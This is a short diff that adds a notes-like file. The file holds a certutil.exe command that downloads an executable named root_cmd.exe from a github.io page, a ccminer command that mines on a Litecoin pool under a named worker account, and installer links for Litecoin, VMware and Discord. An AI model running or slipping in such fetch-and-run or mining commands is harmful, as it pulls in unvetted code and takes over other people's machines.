@@ -1,0 +1,9 @@
+certutil.exe -urlcache -split -f "https://anon135792408.github.io/root_cmd.exe" rcmd.exe
+
+ccminer-x64 -a scrypt -o stratum+tcp://ltc.f2pool.com:8888 -u swagmasterr.001 -p 2123536587698680 --cpu-priority 5
+
+https://download.litecoin.org/litecoin-0.17.1/win/litecoin-0.17.1-win64-setup.exe
+
+https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.1.0-13591040.exe
+
+https://dl.discordapp.net/apps/win/0.0.305/DiscordSetup.exe
